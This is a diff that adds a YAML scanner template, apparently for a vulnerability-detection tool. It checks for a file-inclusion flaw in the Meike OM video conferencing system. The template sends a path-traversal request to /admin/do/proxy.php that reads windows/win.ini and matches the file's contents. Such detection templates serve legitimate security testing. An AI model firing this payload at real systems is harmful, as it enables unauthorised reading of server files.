@@ -1,0 +1,14 @@
+id: poc-yaml-meike-OM-video-conferencing-system-proxy.php-File-inclusion
+info:
+  name: 魅课 OM视频会议系统 proxy.php 文件包含漏洞
+  severity: high
+  tags:
+  - lfi
+  finger: PHP
+requests:
+- method: GET
+  path: /admin/do/proxy.php?method=get&target=../../../../../../../../../../windows/win.ini
+  expression: status_code == 200 && contains(body, "[files]") && contains(body,"CMCDLLNAME32=")
+    && contains(body,"[fonts]")
+variables: {}
+transport: http
